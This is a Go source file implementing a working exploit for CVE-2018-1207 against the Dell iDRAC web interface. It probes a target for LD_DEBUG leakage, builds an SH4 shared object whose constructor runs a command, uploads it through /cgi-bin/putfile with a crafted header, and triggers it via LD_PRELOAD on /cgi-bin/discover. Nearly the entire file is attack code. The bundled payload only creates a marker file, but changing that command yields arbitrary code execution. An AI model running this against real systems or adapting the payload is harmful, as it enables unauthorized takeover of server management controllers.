package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	FFLAGS       = 1
	PAYLOAD_NAME = "cve-2018-1207"
	VERIFY_FILE  = "/tmp/cve-2018-1207.txt"
)

const PAYLOAD = `#include <unistd.h>
#include <stdio.h>

static void before_main(void) __attribute__((constructor));
static void before_main(void) 
{
    int pid = fork();
    if(!pid) {
        execl("/bin/touch", "touch", "` + VERIFY_FILE + `", NULL);
    }
}
`

var (
	target string
	port   string
)

func main() {

	flag.StringVar(&target, "t", "", "the target host/IP.")
	flag.StringVar(&port, "p", "443", "the port to target.")
	flag.Parse()

	if target == "" {
		log.Fatal("You need to enter a target.")
	}

	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		if port == "443" {
			target = "https://" + target
		} else if port == "80" {
			target = "http://" + target
		}
	}

	// Check if vulnerable
	fmt.Println("Checking to see if the target is vulnerable...")
	vulnCheck, _ := makeHttpRequest("GET", target+"/cgi-bin/login?LD_DEBUG=files", nil)
	if strings.Contains(vulnCheck, "calling init: /lib/") {
		fmt.Println("[+] Target is vulnerable!")
	} else {
		fmt.Println("[-] Target isn't vulnerable")
		os.Exit(1)
	}

	// Payload generation
	payloadGenerate()

	// Check for artifacts from previous exploits
	fmt.Println("Checking for previous artifacts...")
	preExploitationCheck(target)

	// Send payload
	postData := convToRaw()

	fmt.Println("Sending payload...")

	_, status := makeHttpRequest("POST", target+"/cgi-bin/putfile", postData)
	if status == 200 {
		fmt.Println("[+] Upload successful!")
	} else {
		fmt.Println("[-] Something unexpected happened. Upload failed.")
		os.Exit(1)
	}

	// Execute payload
	fmt.Println("Executing payload...")
	body, status := makeHttpRequest("GET", target+"/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp", nil)
	if status == 200 {
		fmt.Println("[+] Payload executed!")
		//fmt.Println("    " + body)
	}

	// Verify file creation
	fmt.Println("Verifying file creation...")
	body, _ = makeHttpRequest("GET", target+"/cgi-bin/discover?LD_PRELOAD="+VERIFY_FILE, nil)
	if strings.Contains(body, "file too short") {
		fmt.Println("[+] File successfully created at '" + VERIFY_FILE + "' !")
		lines := strings.Split(body, "\n")
		for _, line := range lines {
			if strings.Contains(line, "ERROR:") {
				fmt.Println("    [!]" + line)
			}
		}
	} else {
		fmt.Println("[-] Something went wrong. File did not appear to get created.")
		lines := strings.Split(body, "\n")
		for _, line := range lines {
			if strings.Contains(line, "ERROR:") {
				fmt.Println("    [!]" + line)
			}
		}
	}

	// Clean up payload files
	cleanPayloads()

}

func cleanPayloads() {
	err := os.Remove("bin/" + PAYLOAD_NAME + ".c")
	if err != nil {
		fmt.Println("[!] Error cleaning " + PAYLOAD_NAME + ".c, clean up manually if necessary.")
	} else {
		fmt.Println("[+] Successfully removed " + PAYLOAD_NAME + ".c")
	}
	err = os.Remove("bin/" + PAYLOAD_NAME + ".so")
	if err != nil {
		fmt.Println("[!] Error cleaning " + PAYLOAD_NAME + ".so, clean up manually if necessary.")
	} else {
		fmt.Println("[+] Successfully removed " + PAYLOAD_NAME + ".so")
	}
}

func convToRaw() *bytes.Buffer {
	f, err := os.Open("bin/" + PAYLOAD_NAME + ".so")

	if err != nil {
		fmt.Println("Error opening file:", err)
		return nil
	}

	defer f.Close()

	stats, err := f.Stat()
	if err != nil {
		return nil
	}

	size := stats.Size()
	payloadSo := make([]byte, size)
	_, err = f.Read(payloadSo)

	if err != nil {
		fmt.Println("Error reading file:", err)
		return nil
	}

	fAlias := "RACPKSSHAUTHKEY1"
	res := []byte(fAlias)

	diff := 32 - len(fAlias)
	if diff > 0 {
		nullBytes := make([]byte, diff)
		res = append(res, nullBytes...)
	}

	length := make([]byte, 4)
	binary.LittleEndian.PutUint32(length, uint32(len(payloadSo)))
	res = append(res, length...)

	flags := make([]byte, 4)
	binary.LittleEndian.PutUint32(flags, FFLAGS)
	res = append(res, flags...)
	res = append(res, payloadSo...)

	postData := bytes.NewBuffer(res)
	return postData
}

func makeHttpRequest(method, url string, reqData io.Reader) (string, int) {

	var body string
	var status int
	t := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		Dial: (&net.Dialer{
			Timeout:   60 * time.Second,
			KeepAlive: 30 * time.Second,
		}).Dial,
		// Sometimes responses take FOREVER.
		TLSHandshakeTimeout: 60 * time.Second,
	}
	c := &http.Client{
		Transport: t,
	}

	if method == "GET" {
		resp, _ := c.Get(url)
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal("Error: Could not convert response body to byte array - ", err)
		}

		bodyString := string(bodyBytes)
		body = bodyString
		status = resp.StatusCode
	} else if method == "POST" {
		resp, _ := c.Post(url, "", reqData)
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal("Error: Could not convert response body to byte array - ", err)
		}

		bodyString := string(bodyBytes)
		body = bodyString
		status = resp.StatusCode
	}
	return body, status
}

func payloadGenerate() {
	if _, err := os.Stat("bin/" + PAYLOAD_NAME + ".c"); errors.Is(err, os.ErrNotExist) {
		fmt.Println("Generating source file...")
		f, err := os.Create("bin/" + PAYLOAD_NAME + ".c")
		if err != nil {
			log.Fatal("Error creating payload source file:", err)
		} else {
			f.WriteString(PAYLOAD)
			f.Close()
			fmt.Println("[+] Source file generated!")
		}
	}

	fmt.Println("Building shared object...")
	cmd := exec.Command("sh4-linux-gnu-gcc-9", "-shared", "-fPIC", "bin/"+PAYLOAD_NAME+".c", "-o", "bin/"+PAYLOAD_NAME+".so")
	_, err := cmd.Output()
	if err != nil {
		log.Fatal("Error creating shared object:", err)
	} else {
		fmt.Println("[+] Shared object created!")
	}
}

func preExploitationCheck(target string) {
	body, _ := makeHttpRequest("GET", target+"/cgi-bin/discover?LD_PRELOAD="+VERIFY_FILE, nil)
	if strings.Contains(body, "file too short") {
		lines := strings.Split(body, "\n")
		for _, line := range lines {
			if strings.Contains(line, "ERROR:") {
				fmt.Println("    [!]" + line)
			}
		}
		cleanPayloads()
		log.Fatal("[-] Verification file already exists on target. Change file name or method of verification.")
	} else if strings.Contains(body, "cannot open shared object file") {
		lines := strings.Split(body, "\n")
		for _, line := range lines {
			if strings.Contains(line, "ERROR:") {
				fmt.Println("    [!]" + line)
			}
		}
		fmt.Println("[+] Verification file doesn't appear to be on target. We're clear to continue!")
	}
}
